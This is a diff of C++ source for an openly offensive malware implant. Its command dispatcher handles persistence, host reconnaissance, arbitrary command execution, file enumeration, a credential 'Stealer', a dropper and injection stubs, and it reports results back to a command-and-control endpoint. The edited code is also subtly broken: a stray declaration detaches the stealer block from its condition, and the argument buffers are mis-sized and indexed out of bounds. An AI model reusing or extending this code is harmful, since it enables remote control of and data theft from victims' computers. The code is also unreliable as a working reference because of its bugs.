@@ -17,14 +17,16 @@ TODO:
 - Injection - Will work on it next time
  */
 
-void execute(std::string command, std::string args, int task_id, int implant_id){
+void execute(std::string command, std::string args, int task_id, int implant_id)
+{
 
     std::string results;
 
     /* Persistance */
     // before publishing - the bat file needs to load the implant.exe
     // only uncomment in sandbox
-    if(command.compare("Persistence 1") == 0){
+    if (command.compare("Persistence 1") == 0)
+    {
         printf("Executing Persistence\n");
         results = "executed";
         // persist_execution();
@@ -32,103 +34,121 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     }
 
     // currently doesn't compile
-    if(command.compare("Persistence 2") == 0){
+    if (command.compare("Persistence 2") == 0)
+    {
         printf("Executing Persistence 2\n");
-        //Add in Persistence_2
-        // Windows Scheduler
+        // Add in Persistence_2
+        //  Windows Scheduler
     }
 
     /* Situational Awareness */
-    if(command.compare("Situational Awareness") == 0){
+    if (command.compare("Situational Awareness") == 0)
+    {
         printf("Executing Situational Awareness\n");
         results = GetAll();
         HttpResponse("/response", implant_id, task_id, results, "success", command);
     }
 
     /* Execution */
-    if(command.compare("Execution") == 0){
+    if (command.compare("Execution") == 0)
+    {
         printf("Executing Execution\n");
         /* I have not double-checked this code
         I grabbed this from our previous patch of code and I'm just
         grabbing the response*/
 
-        //split on space
+        // split on space
         int i = args.find(" ");
-        char * prog = (char *) malloc(i);
-        for (int j =0; j < i; j++){
+        char *prog = (char *)malloc(i);
+        for (int j = 0; j < i; j++)
+        {
             prog[j] = args[j];
         }
-        char * a = (char *) malloc(args.size() - i);
-        for (int k = i; k < args.size(); k++){
+        char *a = (char *)malloc(args.size() - i);
+        for (int k = i; k < args.size(); k++)
+        {
             a[k] = args[k];
         }
-        
-        std::string res = exec(prog,a);
-            
+
+        std::string res = exec(prog, a);
+
         results = res;
         HttpResponse("/response", implant_id, task_id, results, "success", command);
     }
-    
+
     /* File Enumeration */
-    if(command.compare("File Enumeration") == 0){
+    if (command.compare("File Enumeration") == 0)
+    {
         printf("Executing File Enumeration\n");
-            //std::string s = std::string("C:\\Windows\\System32");
+        // std::string s = std::string("C:\\Windows\\System32");
         std::string path = args;
-        std::vector<std::string> file_names (getFileNamesFromPath(path));
+        std::vector<std::string> file_names(getFileNamesFromPath(path));
 
         std::stringstream storage;
-        for (auto iterator = file_names.begin(); iterator != file_names.end(); iterator++){
-            if (iterator != file_names.begin()){
+        for (auto iterator = file_names.begin(); iterator != file_names.end(); iterator++)
+        {
+            if (iterator != file_names.begin())
+            {
                 storage << " ";
             }
             storage << *iterator;
         }
-            //std::string s = std::accumulate(ss.begin(), ss.end(), std::string(""));
+        // std::string s = std::accumulate(ss.begin(), ss.end(), std::string(""));
         std::string result = storage.str();
-            //std::cout << result << std::endl;
-            //std::string item = 
+        // std::cout << result << std::endl;
+        // std::string item =
         HttpResponse("/response", implant_id, task_id, result, "success", command);
-            //std::cout << item;
+        // std::cout << item;
     }
 
     /* Retrieval */
     // doesn't work?
-    if(command.compare("Retrieval") ==0 ){
+    if (command.compare("Retrieval") == 0)
+    {
         printf("Executing Retrieval\n");
-        //Where we add in SendToC2
+        // Where we add in SendToC2
     }
 
     /* Stealer Function */
-    if(command.compare("Stealer") == 0){
+    if (command.compare("Stealer") == 0)
+    int error = 0;
+    {
         json data_from_driver;
         printf("Executing Stealer\n");
-        data_from_driver = driver();
-        results = data_from_driver.dump();
+        try
+        {
+            data_from_driver = driver();
+            results = data_from_driver.dump();
 
-        /* Send the response back to the server */
+        }
+        catch(...)
+        {
+            HttpResponse("/response", implant_id, task_id, results, "failure", command);
+            return;
+        }
+
         HttpResponse("/response", implant_id, task_id, results, "success", command);
+        /* Send the response back to the server */
     }
 
     /* Dropper */
-    if(command.compare("Dropper") == 0){
+    if (command.compare("Dropper") == 0)
+    {
         printf("Executing Dropper\n");
-        //Dropper();
+        // Dropper();
     }
 
     /* Injection */
-    //hasn't been implemented
-    if(command.compare("Injection") == 0){
+    // hasn't been implemented
+    if (command.compare("Injection") == 0)
+    {
         printf("Executing Injection\n");
-
     }
     return;
 }
 
-
-
-
-
-std::string exec(char* program, char* args){
+std::string exec(char *program, char *args)
+{
     int cmdLen = strlen(program) + strlen(args);
 
     LPSTR parsedCmds = (char *)malloc((cmdLen + 16) * sizeof(char));
@@ -218,7 +238,7 @@ std::string exec(char* program, char* args){
     LPDWORD lpBytesRead = &bytesRead;
     DWORD exitCode;
     LPDWORD lpExitCode = &exitCode;
-   
+
     while (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT)
     {
         PeekNamedPipe(
@@ -238,14 +258,11 @@ std::string exec(char* program, char* args){
                 lpBytesRead,
                 NULL);
 
-            //printf(buffer);
+            // printf(buffer);
 
             *lpTotalBytesAvail = *lpTotalBytesAvail - *lpBytesRead;
         }
-
-
     }
-
 
     // TODO: perform any cleanup necessary!
     // The parent processes no longer needs a handle to the child processes, the running thread, or the out file!
